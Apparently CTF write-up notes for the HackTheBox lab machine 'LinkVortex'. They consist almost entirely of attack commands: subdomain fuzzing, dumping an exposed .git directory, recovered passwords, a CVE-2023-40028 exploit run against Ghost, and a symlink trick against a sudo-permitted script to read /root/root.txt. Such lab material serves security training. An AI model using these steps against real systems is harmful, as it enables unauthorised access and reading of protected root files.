---
title: "LinkVortex"
---

# LinkVortex

```bash
ffuf -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -ac
```

```bash
wget --mirror -I .git http://dev.linkvortex.htb/.git/
```

```bash
wget --mirror -I .git http://dev.linkvortex.htb/.git/
sudo git restore .
```

```bash
git log
git status
git diff --cached
```

```
admin \ OctopiFociPilfer45
```

```bash
bash CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
```

```
bob \ fibber-talented-worth
```

```bash
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then #Hay que definirla antes del script
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then #Tiene que acabar en png
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

```bash
ln -s /root/root.txt img.png
```

```bash
ln -s /tmp/pentest/img.png img2.png
```

```
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh img2.png 
```
